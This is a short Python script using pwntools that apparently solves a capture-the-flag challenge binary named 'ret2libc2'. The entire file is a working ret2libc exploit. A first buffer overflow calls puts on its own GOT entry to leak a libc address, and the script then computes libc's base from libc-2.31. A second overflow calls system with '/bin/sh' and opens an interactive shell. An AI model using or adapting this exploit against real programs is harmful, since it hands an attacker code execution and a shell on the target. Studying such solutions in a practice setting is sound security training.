from pwn import *
p = process("./ret2libc2")
elf = p.elf
main = elf.sym['main']
puts = elf.plt['puts']
puts_got = elf.got['puts']

p.sendline(b"a"*0x70 + b''.join(p32(i) for i in [
    puts, main, puts_got]))
p.recvuntil(b"What do you think ?")
puts_libc = int.from_bytes(p.recv(4), "little")

libc = ELF("/usr/lib32/libc-2.31.so")
libc.address = puts_libc - libc.sym['puts']
p.sendline(b"a"*(0x64+4) + b''.join(p32(i) for i in [
    libc.sym['system'], 0, next(libc.search(b'/bin/sh'))]))
p.interactive()